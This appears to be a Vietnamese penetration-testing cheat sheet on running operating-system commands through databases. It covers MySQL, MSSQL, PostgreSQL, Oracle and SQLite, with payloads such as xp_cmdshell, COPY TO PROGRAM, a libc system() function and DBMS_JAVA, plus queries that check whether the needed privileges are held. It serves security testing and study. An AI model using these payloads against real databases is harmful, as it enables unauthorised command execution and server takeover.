# OS Command

| DBMS | Hàm / Primitive | Cách dùng | Quyền / điều kiện |
|---|---|---|---|
| MySQL | `sys_exec()` | `SELECT sys_exec('id');` | Cần UDF đã được cài; thường cần quyền rất cao |
| MySQL | `sys_eval()` | `SELECT sys_eval('id');` | Cần UDF đã được cài; thường cần quyền rất cao |
| MSSQL | `xp_cmdshell` | `EXEC xp_cmdshell 'whoami';` | Phải được bật; thường cần quyền cao |
| MSSQL | `sp_execute_external_script` | `EXEC sp_execute_external_script @language = N'Python', @script = N'print(1)';` | Cần feature external script bật và có quyền thực thi |
| PostgreSQL | `COPY ... PROGRAM` | `COPY (SELECT '') TO PROGRAM 'id';` | Cần superuser hoặc role `pg_execute_server_program` |
| PostgreSQL | Function gọi `system` | `CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('id');` | Cần quyền tạo function native / superuser |
| Oracle | `DBMS_JAVA.RUNJAVA` | `SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c id') FROM dual;` | Cần Java privilege phù hợp |
| Oracle | `DBMS_JAVA_TEST.FUNCALL` | `SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','id') FROM dual;` | Cần Java privilege phù hợp |
| Oracle | `DBMS_SCHEDULER.CREATE_JOB` | `BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'exec', job_type => 'EXECUTABLE', job_action => '/bin/id', enabled => TRUE); END;` | Cần quyền scheduler / executable job |
| Oracle | `os_command.exec_clob()` | `SELECT os_command.exec_clob('id') FROM dual;` | Package phải tồn tại và có quyền `EXECUTE` |
| SQLite | `load_extension()` | `SELECT load_extension('/path/to/ext.so', 'sqlite3_extension_init');` | `load_extension` phải được bật; cần nạp được shared library |

### Xem quyền / kiểm tra

#### MySQL

```sql
SHOW GRANTS FOR CURRENT_USER();
SHOW VARIABLES LIKE 'secure_file_priv';
SELECT * FROM mysql.func;
```

#### MSSQL

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
EXEC sp_configure 'xp_cmdshell';
EXEC sp_configure 'external scripts enabled';
SELECT OBJECT_ID('spWriteStringToFile');
```

#### PostgreSQL

```sql
SELECT rolsuper, rolname
FROM pg_roles
WHERE rolname = current_user;

SELECT pg_has_role(current_user, 'pg_read_server_files', 'member');
SELECT pg_has_role(current_user, 'pg_write_server_files', 'member');
SELECT pg_has_role(current_user, 'pg_execute_server_program', 'member');
```

#### Oracle

```sql
SELECT * FROM session_privs;
SELECT * FROM user_tab_privs WHERE table_name = 'UTL_FILE';
SELECT * FROM all_directories;
SELECT * FROM user_java_policy;
SELECT * FROM dba_java_policy;
SELECT * FROM user_scheduler_jobs;
SELECT object_name FROM all_objects WHERE object_name = 'OS_COMMAND';
```

#### SQLite

```sql
PRAGMA compile_options;
PRAGMA database_list;
```